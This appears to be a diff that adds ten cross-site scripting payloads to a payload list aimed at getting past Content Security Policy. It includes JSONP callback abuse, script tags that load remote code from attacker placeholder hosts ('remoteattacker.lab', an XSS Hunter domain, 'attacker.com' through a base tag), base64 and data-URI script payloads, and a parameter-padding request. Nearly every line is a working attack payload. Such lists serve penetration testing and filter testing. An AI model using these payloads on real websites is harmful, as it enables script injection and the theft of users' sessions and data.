@@ -1,0 +1,10 @@
+<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
+script=document.createElement('script');
+script.src='//remoteattacker.lab/csp.js';
+window.frames[0].document.head.appendChild(script);
+d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<script src="data:,alert(1)">/</script>
+"/><script>alert(1);</script>
+<base href=http://www.attacker.com>
+GET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[REPEATED &a 1000 times]&a&a&a&a
